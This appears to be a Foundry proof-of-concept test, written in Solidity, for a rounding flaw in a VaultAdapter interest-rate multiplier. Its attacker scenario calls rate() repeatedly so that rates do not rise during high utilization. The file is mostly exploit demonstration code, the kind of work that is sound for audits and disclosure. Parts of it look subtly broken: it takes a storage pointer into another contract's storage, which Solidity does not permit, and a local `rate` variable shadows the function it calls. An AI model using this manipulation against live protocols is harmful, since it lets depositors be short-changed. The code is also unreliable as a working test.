// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {VaultAdapter} from "../../contracts/oracle/libraries/VaultAdapter.sol";
import {IVault} from "../../contracts/interfaces/IVault.sol";
import {IVaultAdapter} from "../../contracts/interfaces/IVaultAdapter.sol";
import {Access} from "../../contracts/access/Access.sol";
import {VaultAdapterStorageUtils} from "../../contracts/storage/VaultAdapterStorageUtils.sol";

// Mock Vault contract to simulate vault behavior
contract MockVault is IVault {
    mapping(address => uint256) public utilizationIndexes;
    mapping(address => uint256) public utilizations;
    
    function setUtilization(address asset, uint256 utilization) external {
        utilizations[asset] = utilization;
    }
    
    function setUtilizationIndex(address asset, uint256 index) external {
        utilizationIndexes[asset] = index;
    }
    
    function utilization(address asset) external view returns (uint256) {
        return utilizations[asset];
    }
    
    function currentUtilizationIndex(address asset) external view returns (uint256) {
        return utilizationIndexes[asset];
    }
}

// Mock Access Control contract
contract MockAccessControl {
    mapping(address => mapping(bytes4 => bool)) public permissions;
    
    function setPermission(address user, bytes4 selector, bool hasPermission) external {
        permissions[user][selector] = hasPermission;
    }
    
    function hasPermission(address user, bytes4 selector) external view returns (bool) {
        return permissions[user][selector];
    }
}

contract ExploitTest is Test {
    VaultAdapter public vaultAdapter;
    MockVault public mockVault;
    MockAccessControl public mockAccessControl;
    
    address public owner = address(0x1);
    address public attacker = address(0x2);
    address public asset = address(0x3);
    
    // Test parameters
    uint256 constant KINK = 8e26; // 80% utilization kink
    uint256 constant RATE = 1e20; // Small rate to make rounding issue more apparent
    uint256 constant MAX_MULTIPLIER = 2e27; // 2x max multiplier
    uint256 constant MIN_MULTIPLIER = 5e26; // 0.5x min multiplier
    uint256 constant SLOPE0 = 1e25; // Base slope
    uint256 constant SLOPE1 = 5e25; // Additional slope after kink
    
    function setUp() public {
        // Deploy mock contracts
        mockVault = new MockVault();
        mockAccessControl = new MockAccessControl();
        
        // Deploy VaultAdapter
        vm.prank(owner);
        vaultAdapter = new VaultAdapter();
        
        // Initialize VaultAdapter
        vm.prank(owner);
        vaultAdapter.initialize(address(mockAccessControl));
        
        // Set up permissions for owner
        mockAccessControl.setPermission(owner, vaultAdapter.setSlopes.selector, true);
        mockAccessControl.setPermission(owner, vaultAdapter.setLimits.selector, true);
        
        // Configure slopes and limits
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            kink: KINK,
            slope0: SLOPE0,
            slope1: SLOPE1
        });
        
        vm.prank(owner);
        vaultAdapter.setSlopes(asset, slopes);
        
        vm.prank(owner);
        vaultAdapter.setLimits(MAX_MULTIPLIER, MIN_MULTIPLIER, RATE);
        
        // Set initial vault state
        mockVault.setUtilization(asset, 9e26); // 90% utilization (above kink)
        mockVault.setUtilizationIndex(asset, 1e27); // Initial index
    }
    
    function test_RoundingIssuePreventsMultiplierIncrease() public {
        // Start with a timestamp
        uint256 startTime = block.timestamp;
        vm.warp(startTime);
        
        // First rate call to initialize utilization data
        uint256 initialRate = vaultAdapter.rate(address(mockVault), asset);
        console.log("Initial rate:", initialRate);
        
        // Get the storage to check multiplier
        VaultAdapter.VaultAdapterStorage storage $ = vaultAdapter.getVaultAdapterStorage();
        uint256 initialMultiplier = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Initial multiplier:", initialMultiplier);
        
        // Fast forward time but not enough to make (_elapsed * RATE / 1e27) > 0
        // With RATE = 1e20, we need elapsed > 1e7 seconds (~115 days) for the term to be > 0
        // We'll use a smaller elapsed time to demonstrate the rounding issue
        uint256 smallElapsed = 1e6; // ~11.5 days
        vm.warp(startTime + smallElapsed);
        
        // Update vault index to simulate utilization change
        mockVault.setUtilizationIndex(asset, 2e27);
        
        // Call rate frequently with small elapsed time
        for (uint256 i = 0; i < 10; i++) {
            vm.warp(startTime + smallElapsed * (i + 1));
            uint256 rate = vaultAdapter.rate(address(mockVault), asset);
            console.log("Rate after call", i + 1, ":", rate);
        }
        
        // Check multiplier after frequent calls
        uint256 finalMultiplier = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Final multiplier after frequent calls:", finalMultiplier);
        
        // The multiplier should not have increased due to rounding
        assertEq(finalMultiplier, initialMultiplier, "Multiplier should not change with small elapsed time");
        
        // Now demonstrate what happens with sufficient elapsed time
        uint256 largeElapsed = 1e8; // ~3.17 years
        vm.warp(startTime + largeElapsed);
        mockVault.setUtilizationIndex(asset, 3e27);
        
        uint256 rateAfterLargeElapsed = vaultAdapter.rate(address(mockVault), asset);
        console.log("Rate after large elapsed time:", rateAfterLargeElapsed);
        
        uint256 multiplierAfterLargeElapsed = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Multiplier after large elapsed time:", multiplierAfterLargeElapsed);
        
        // With sufficient elapsed time, the multiplier should increase
        assertTrue(multiplierAfterLargeElapsed > initialMultiplier, "Multiplier should increase with sufficient elapsed time");
    }
    
    function test_RoundingIssuePreventsMultiplierDecrease() public {
        // Set utilization below kink to test decrease path
        mockVault.setUtilization(asset, 7e26); // 70% utilization (below kink)
        
        // Start with a timestamp
        uint256 startTime = block.timestamp;
        vm.warp(startTime);
        
        // First rate call to initialize utilization data
        uint256 initialRate = vaultAdapter.rate(address(mockVault), asset);
        console.log("Initial rate (below kink):", initialRate);
        
        // Get the storage to check multiplier
        VaultAdapter.VaultAdapterStorage storage $ = vaultAdapter.getVaultAdapterStorage();
        uint256 initialMultiplier = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Initial multiplier (below kink):", initialMultiplier);
        
        // Fast forward time but not enough to make (_elapsed * RATE / 1e27) > 0
        uint256 smallElapsed = 1e6; // ~11.5 days
        vm.warp(startTime + smallElapsed);
        
        // Update vault index to simulate utilization change
        mockVault.setUtilizationIndex(asset, 2e27);
        
        // Call rate frequently with small elapsed time
        for (uint256 i = 0; i < 10; i++) {
            vm.warp(startTime + smallElapsed * (i + 1));
            uint256 rate = vaultAdapter.rate(address(mockVault), asset);
            console.log("Rate after call", i + 1, "(below kink):", rate);
        }
        
        // Check multiplier after frequent calls
        uint256 finalMultiplier = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Final multiplier after frequent calls (below kink):", finalMultiplier);
        
        // The multiplier should not have decreased due to rounding
        assertEq(finalMultiplier, initialMultiplier, "Multiplier should not change with small elapsed time");
        
        // Now demonstrate what happens with sufficient elapsed time
        uint256 largeElapsed = 1e8; // ~3.17 years
        vm.warp(startTime + largeElapsed);
        mockVault.setUtilizationIndex(asset, 3e27);
        
        uint256 rateAfterLargeElapsed = vaultAdapter.rate(address(mockVault), asset);
        console.log("Rate after large elapsed time (below kink):", rateAfterLargeElapsed);
        
        uint256 multiplierAfterLargeElapsed = $.utilizationData[address(mockVault)][asset].multiplier;
        console.log("Multiplier after large elapsed time (below kink):", multiplierAfterLargeElapsed);
        
        // With sufficient elapsed time, the multiplier should decrease
        assertTrue(multiplierAfterLargeElapsed < initialMultiplier, "Multiplier should decrease with sufficient elapsed time");
    }
    
    function test_AttackerCanPreventInterestRateAdjustment() public {
        // Attacker scenario: Prevent interest rate from increasing during high utilization
        
        // Set high utilization (above kink)
        mockVault.setUtilization(asset, 95e25); // 95% utilization
        
        // Start with a timestamp
        uint256 startTime = block.timestamp;
        vm.warp(startTime);
        
        // Get initial rate
        uint256 initialRate = vaultAdapter.rate(address(mockVault), asset);
        console.log("Initial rate at high utilization:", initialRate);
        
        // Attacker calls rate frequently to prevent multiplier increase
        // Using small elapsed times to trigger rounding issue
        uint256 attackInterval = 1e6; // ~11.5 days
        
        for (uint256 i = 0; i < 20; i++) {
            vm.warp(startTime + attackInterval * (i + 1));
            mockVault.setUtilizationIndex(asset, 1e27 + (i + 1) * 1e25);
            
            // Attacker calls rate
            vm.prank(attacker);
            uint256 rate = vaultAdapter.rate(address(mockVault), asset);
            
            // Rate should not increase significantly due to rounding
            assertTrue(rate < initialRate * 11 / 10, "Rate should not increase more than 10% due to rounding");
        }
        
        // Final rate after attack
        uint256 finalRate = vaultAdapter.rate(address(mockVault), asset);
        console.log("Final rate after frequent calls:", finalRate);
        
        // The rate should be much lower than what it would be with proper multiplier adjustment
        assertTrue(finalRate < initialRate * 2, "Rate manipulation successful - prevented excessive increase");
    }
}